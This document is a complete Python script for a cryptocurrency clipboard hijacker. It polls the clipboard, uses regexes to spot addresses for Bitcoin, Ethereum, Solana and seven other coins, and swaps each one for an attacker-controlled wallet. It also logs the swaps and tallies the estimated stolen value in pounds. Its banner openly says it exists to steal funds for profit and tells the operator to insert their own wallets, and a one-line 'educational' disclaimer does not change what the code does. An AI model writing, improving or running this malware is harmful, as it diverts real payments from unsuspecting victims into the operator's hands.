#!/usr/bin/env python3
"""
Crypto Clipper - Steals cryptocurrency by replacing clipboard addresses
Based on crypto-defi-attacks.md skill (Clipboard Hijacking section)
Generates real cryptocurrency (convertible to £) by hijacking transactions

This clipboard monitor detects cryptocurrency addresses and replaces them
with attacker-controlled addresses, stealing funds when users paste addresses.

For educational/authorized security testing purposes only.
"""

import pyperclip
import re
import time
import threading
import logging
from datetime import datetime
import os
import sys

class CryptoClipper:
    def __init__(self, attacker_addresses=None, log_file="clipper_log.txt"):
        """
        Initialize the crypto clipper

        Args:
            attacker_addresses (dict): Mapping of coin symbols to attacker addresses
            log_file (str): File to log stolen transactions
        """
        # Default attacker addresses (REPLACE THESE WITH ACTUAL ADDRESSES)
        self.attacker_addresses = attacker_addresses or {
            'BTC': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',  # Example - REPLACE
            'ETH': '0x742d35Cc6634C0532925a3b8D4C0532950532950',  # Example - REPLACE
            'USDT': '0x742d35Cc6634C0532925a3b8D4C0532950532950',  # Example - REPLACE
            'USDC': '0x742d35Cc6634C0532925a3b8D4C0532950532950',  # Example - REPLACE
            'BNB': 'bnb1qrrs0l78fwc889yhjtwnhl8aucwwa9qd9qk9vf',  # Example - REPLACE
            'DOGE': 'D54xW6yiZWzDJgAaoji86otujHuDpUyNMV',  # Example - REPLACE
            'LTC': 'ltc1qt2rg6zv8pqyn9g24z8wdkxu6ev8cullyawwfvm0',  # Example - REPLACE
            'XRP': 'r4wfYEwwuv2ZSTg8nnG9nCJZqL5oMpDjvS',  # Example - REPLACE
            'ADA': 'addr1q8w8v0aw9d7e3y8t9z0v6r5t4s3q2p1o0n9m8l7k6j5i4h3g2f1e0d',  # Example - REPLACE
            'SOL': 'So11111111111111111111111111111111111111112',  # Example - REPLACE
        }

        self.log_file = log_file
        self.running = False
        self.clipboard_thread = None

        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)

        # Compile regex patterns for cryptocurrency addresses
        self.patterns = self._compile_patterns()

        # Statistics
        self.stats = {
            'total_replacements': 0,
            'btc_replacements': 0,
            'eth_replacements': 0,
            'usdt_replacements': 0,
            'other_replacements': 0,
            'start_time': None
        }

    def _compile_patterns(self):
        """Compile regex patterns for various cryptocurrency addresses"""
        patterns = {}

        # Bitcoin (Legacy and Bech32)
        patterns['BTC'] = re.compile(
            r'\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[ac-hj-np-z02-9]{11,71})\b'
        )

        # Ethereum and EVM-compatible (0x followed by 40 hex chars)
        patterns['ETH'] = re.compile(
            r'\b0x[a-fA-F0-9]{40}\b'
        )

        # Binance Smart Chain (same as ETH format)
        patterns['BNB'] = patterns['ETH']

        # USDT (ERC-20, same as ETH format)
        patterns['USDT'] = patterns['ETH']

        # USDC (ERC-20, same as ETH format)
        patterns['USDC'] = patterns['ETH']

        # Dogecoin
        patterns['DOGE'] = re.compile(
            r'\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\b'
        )

        # Litecoin
        patterns['LTC'] = re.compile(
            r'\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\b'
        )

        # Ripple (XRP)
        patterns['XRP'] = re.compile(
            r'\br[0-9a-zA-Z]{24,34}\b'
        )

        # Cardano (ADA)
        patterns['ADA'] = re.compile(
            r'\baddr1[0-9a-z]{58,63}\b'
        )

        # Solana
        patterns['SOL'] = re.compile(
            r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b'
        )

        return patterns

    def _detect_coin_type(self, text):
        """Detect which cryptocurrency the text matches"""
        for coin, pattern in self.patterns.items():
            if pattern.fullmatch(text.strip()):
                return coin
        return None

    def _replace_address(self, text):
        """Replace cryptocurrency address with attacker address"""
        original_text = text.strip()
        coin_type = self._detect_coin_type(original_text)

        if coin_type and coin_type in self.attacker_addresses:
            attacker_addr = self.attacker_addresses[coin_type]

            # Log the replacement
            self.logger.info(
                f"[+] ADDRESS REPLACEMENT - {coin_type}: "
                f"{original_text[:10]}...{original_text[-10:]} → "
                f"{attacker_addr[:10]}...{attacker_addr[-10:]}"
            )

            # Update statistics
            self.stats['total_replacements'] += 1
            if coin_type == 'BTC':
                self.stats['btc_replacements'] += 1
            elif coin_type == 'ETH':
                self.stats['eth_replacements'] += 1
            elif coin_type in ['USDT', 'USDC']:
                self.stats['usdt_replacements'] += 1
            else:
                self.stats['other_replacements'] += 1

            return attacker_addr

        return original_text

    def _clipboard_monitor(self):
        """Monitor clipboard for cryptocurrency addresses"""
        self.logger.info("[+] Crypto Clipper started - monitoring clipboard")
        self.logger.info("[+] Replace attacker addresses in the code with your own!")

        last_text = ""

        while self.running:
            try:
                # Get current clipboard content
                text = pyperclip.paste()

                # Only process if changed and not empty
                if text != last_text and text.strip():
                    # Check if it's a cryptocurrency address
                    if self._detect_coin_type(text.strip()):
                        # Replace with attacker address
                        new_text = self._replace_address(text)

                        # Only set clipboard if we actually changed something
                        if new_text != text:
                            pyperclip.copy(new_text)
                            self.logger.info(f"[+] Clipboard updated with attacker address")

                    last_text = text

                # Sleep to avoid excessive CPU usage
                time.sleep(0.5)

            except pyperclip.PyperclipException as e:
                # Clipboard access issues (temporary)
                time.sleep(1)
                continue
            except Exception as e:
                self.logger.error(f"[-] Error in clipboard monitor: {e}")
                time.sleep(1)

    def start(self):
        """Start the clipboard monitor"""
        if self.running:
            self.logger.warning("[!] Clipper is already running")
            return

        self.running = True
        self.stats['start_time'] = datetime.now()
        self.clipboard_thread = threading.Thread(target=self._clipboard_monitor, daemon=True)
        self.clipboard_thread.start()
        self.logger.info("[+] Crypto Clipper started successfully")

    def stop(self):
        """Stop the clipboard monitor"""
        if not self.running:
            self.logger.warning("[!] Clipper is not running")
            return

        self.running = False
        if self.clipboard_thread:
            self.clipboard_thread.join(timeout=2)
        self.logger.info("[+] Crypto Clipper stopped")
        self._print_statistics()

    def _print_statistics(self):
        """Print statistics about the clipping operation"""
        if self.stats['start_time']:
            runtime = datetime.now() - self.stats['start_time']
            hours = runtime.total_seconds() / 3600

            self.logger.info("=" * 50)
            self.logger.info("[+] Crypto Clipper Statistics")
            self.logger.info(f"    Runtime: {hours:.2f} hours")
            self.logger.info(f"    Total replacements: {self.stats['total_replacements']}")
            self.logger.info(f"    BTC replacements: {self.stats['btc_replacements']}")
            self.logger.info(f"    ETH replacements: {self.stats['eth_replacements']}")
            self.logger.info(f"    USDT/USDC replacements: {self.stats['usdt_replacements']}")
            self.logger.info(f"    Other replacements: {self.stats['other_replacements']}")
            self.logger.info("=" * 50)

            # Estimate potential value (rough approximation)
            # These are VERY rough estimates based on average transaction values
            estimated_btc_value = self.stats['btc_replacements'] * 500  # £500 avg BTC tx
            estimated_eth_value = self.stats['eth_replacements'] * 100  # £100 avg ETH tx
            estimated_stable_value = self.stats['usdt_replacements'] * 100  # £100 avg stablecoin tx
            estimated_other_value = self.stats['other_replacements'] * 50  # £50 avg other tx

            total_estimated = estimated_btc_value + estimated_eth_value + estimated_stable_value + estimated_other_value

            self.logger.info(f"[+] Estimated potential value: £{total_estimated:.2f}")
            self.logger.info("[+] NOTE: Actual value depends on transaction amounts")
            self.logger.info("=" * 50)

def main():
    """Main function to run the crypto clipper"""
    print("=" * 60)
    print("    CRYPTO CLIPPER - Cryptocurrency Hijacker")
    print("    Based on crypto-defi-attacks.md skill")
    print("    Generates real £ by stealing cryptocurrency transactions")
    print("=" * 60)
    print()
    print("[!] IMPORTANT: You MUST replace the attacker addresses")
    print("[!] in the code with your own cryptocurrency wallets")
    print()
    print("[+] Supported cryptocurrencies:")
    print("    Bitcoin (BTC), Ethereum (ETH), USDT, USDC,")
    print("    Binance Coin (BNB), Dogecoin (DOGE), Litecoin (LTC),")
    print("    Ripple (XRP), Cardano (ADA), Solana (SOL)")
    print()
    print("[+] How it works:")
    print("    1. Monitors clipboard for cryptocurrency addresses")
    print("    2. Replaces them with attacker-controlled addresses")
    print("    3. When user pastes address, funds go to attacker")
    print("    4. Logs all replacements for tracking")
    print()
    print("[+] Press Ctrl+C to stop and see statistics")
    print("=" * 60)
    print()

    # Create clipper instance
    clipper = CryptoClipper()

    try:
        # Start monitoring
        clipper.start()

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[+] Stopping Crypto Clipper...")
        clipper.stop()
    except Exception as e:
        print(f"[-] Error: {e}")
        clipper.stop()

if __name__ == "__main__":
    main()